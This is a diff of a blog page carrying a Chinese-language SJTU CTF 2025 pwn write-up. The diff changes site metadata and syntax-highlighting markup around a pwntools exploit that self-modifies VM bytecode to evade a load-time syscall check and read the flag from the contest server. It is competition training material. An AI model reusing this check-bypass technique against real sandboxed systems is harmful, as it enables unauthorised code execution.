@@ -16,21 +16,22 @@
         document.documentElement.setAttribute('data-theme', 'light');
       }
     })();
-  </script><!-- Begin Jekyll SEO tag v2.8.0 -->
+  </script><!-- Begin Jekyll SEO tag v2.9.0 -->
 <title>SJTU CTF 2025 PWN Writeup | Y²的博客</title>
-<meta name="generator" content="Jekyll v3.10.0" />
+<meta name="generator" content="Jekyll v4.4.1" />
 <meta property="og:title" content="SJTU CTF 2025 PWN Writeup" />
 <meta name="author" content="Y² (aka.cameudis)" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="ret2vmcode" />
-<meta property="og:description" content="ret2vmcode" />
+<meta name="twitter:description" property="og:description" content="ret2vmcode" />
 <link rel="canonical" href="https://www.cameudis.com/2025/04/11/SJTUCTF-2025.html" />
 <meta property="og:url" content="https://www.cameudis.com/2025/04/11/SJTUCTF-2025.html" />
 <meta property="og:site_name" content="Y²的博客" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2025-04-11T00:00:00+08:00" />
+<meta property="article:modified_time" content="2025-04-11T00:00:00+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="SJTU CTF 2025 PWN Writeup" />
+<meta name="twitter:title" content="SJTU CTF 2025 PWN Writeup" />
 <script type="application/ld+json">
 {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Y² (aka.cameudis)"},"dateModified":"2025-04-11T00:00:00+08:00","datePublished":"2025-04-11T00:00:00+08:00","description":"ret2vmcode","headline":"SJTU CTF 2025 PWN Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2025/04/11/SJTUCTF-2025.html"},"url":"https://www.cameudis.com/2025/04/11/SJTUCTF-2025.html"}</script>
 <!-- End Jekyll SEO tag -->
@@ -433,34 +434,34 @@
 <p>虚拟机。首先逆向出指令格式：</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">packins</span><span class="p">(</span><span class="n">opc</span><span class="p">,</span> <span class="n">op1</span><span class="p">,</span> <span class="n">op2</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="n">opc</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">op1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">op2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="n">opc</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">op1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">op2</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">imm</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF1</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF1</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF2</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF2</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF4</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF4</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">push</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF5</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF5</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">pop</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF6</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF6</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">load</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF7</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF7</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">)</span>
 
-<span class="s">"open(r1) -&gt; r0"</span>
+<span class="sh">"</span><span class="s">open(r1) -&gt; r0</span><span class="sh">"</span>
 <span class="k">def</span> <span class="nf">sys_open</span><span class="p">():</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 
-<span class="s">"read(r1, r2, r3) -&gt; r0"</span>
+<span class="sh">"</span><span class="s">read(r1, r2, r3) -&gt; r0</span><span class="sh">"</span>
 <span class="k">def</span> <span class="nf">sys_read</span><span class="p">():</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 
-<span class="s">"write(r1, r2, r3) -&gt; r0"</span>
+<span class="sh">"</span><span class="s">write(r1, r2, r3) -&gt; r0</span><span class="sh">"</span>
 <span class="k">def</span> <span class="nf">sys_write</span><span class="p">():</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>虽然提供了几个 syscall，但被 <code class="language-plaintext highlighter-rouge">vm_check</code> 拦下了。好在提供的内存交互指令可以直接操控 imem，也就是自修改程序。我的思路是先写好恶意的 vm code 后，把涉及 sys 的 opcode 改成别的字符发送给程序，在运行我的 vm code 时将那几个字节改回 syscall 对应的 opcode，以此绕过只在读入时进行检查的 <code class="language-plaintext highlighter-rouge">vm_check</code>。</p>
@@ -476,71 +477,71 @@
 #
 # Copyright © 2025 y2 &lt;cameudis@gmail.com&gt;
 </span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">]</span>
 
 <span class="c1"># ---------------- Environment Config ---------------- #
 </span>
-<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>
-<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
-<span class="n">ip</span> <span class="o">=</span> <span class="s">"instance.penguin.0ops.sjtu.cn"</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./pwn</span><span class="sh">"</span>
+<span class="n">libc_name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">instance.penguin.0ops.sjtu.cn</span><span class="sh">"</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">18421</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
 <span class="c1"># libc = ELF(libc_name)
 </span>
-<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
 <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">filename</span>
 
 <span class="c1"># ------------------- Exploitation ------------------- #
 </span>
-<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">packins</span><span class="p">(</span><span class="n">opc</span><span class="p">,</span> <span class="n">op1</span><span class="p">,</span> <span class="n">op2</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="n">opc</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">op1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">op2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="n">opc</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">op1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">op2</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">imm</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF1</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF1</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF2</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF2</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF4</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF4</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">push</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF5</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF5</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">pop</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF6</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF6</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">load</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF7</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF7</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">)</span>
 
-<span class="s">"open(r1) -&gt; r0"</span>
+<span class="sh">"</span><span class="s">open(r1) -&gt; r0</span><span class="sh">"</span>
 <span class="k">def</span> <span class="nf">sys_open</span><span class="p">():</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 
-<span class="s">"read(r1, r2, r3) -&gt; r0"</span>
+<span class="sh">"</span><span class="s">read(r1, r2, r3) -&gt; r0</span><span class="sh">"</span>
 <span class="k">def</span> <span class="nf">sys_read</span><span class="p">():</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 
-<span class="s">"write(r1, r2, r3) -&gt; r0"</span>
+<span class="sh">"</span><span class="s">write(r1, r2, r3) -&gt; r0</span><span class="sh">"</span>
 <span class="k">def</span> <span class="nf">sys_write</span><span class="p">():</span>
-    <span class="k">return</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xF9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
 
-    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'Initialized at '</span><span class="p">)</span>
-    <span class="n">mem_ptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'.'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"mem_ptr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">mem_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Initialized at </span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">mem_ptr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">mem_ptr: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">mem_ptr</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-    <span class="s">"""
+    <span class="sh">"""</span><span class="s">
     [DEBUG] Sent 0xac bytes:
         00000000  f1 00 00 00  00 00 00 00  00 f1 02 00  00 00 c0 16  │····│····│····│····│
         00000010  dd 56 f8 02  00 00 00 00  00 00 00 f1  00 00 00 00  │·V··│····│····│····│
@@ -554,62 +555,62 @@
         00000090  f9 01 00 00  00 00 00 00  00 f1 01 00  00 00 01 00  │····│····│····│····│
         000000a0  00 00 f9 02  00 00 00 00  00 00 00 0a               │····│····│····│
         000000ac
-    """</span>
+    </span><span class="sh">"""</span>
     
-    <span class="n">code</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x03f90000</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0x7c</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x01f9</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0x90</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x02f90000</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x03f90000</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0x7c</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x01f9</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0x90</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x02f90000</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
 
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x67616c66</span><span class="p">)</span> <span class="c1"># flag
-</span>    <span class="n">code</span> <span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x67616c66</span><span class="p">)</span> <span class="c1"># flag
+</span>    <span class="n">code</span> <span class="o">+=</span> <span class="nf">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0x210</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">mem_ptr</span><span class="o">+</span><span class="mh">0x210</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
 
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xE9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># sys_open
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xE9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># sys_open
 </span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xE9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># sys_read
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">packins</span><span class="p">(</span><span class="mh">0xE9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># sys_read
 </span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-    <span class="n">code</span> <span class="o">+=</span> <span class="n">packins</span><span class="p">(</span><span class="mh">0xE9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># sys_write
+    <span class="n">code</span> <span class="o">+=</span> <span class="nf">imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
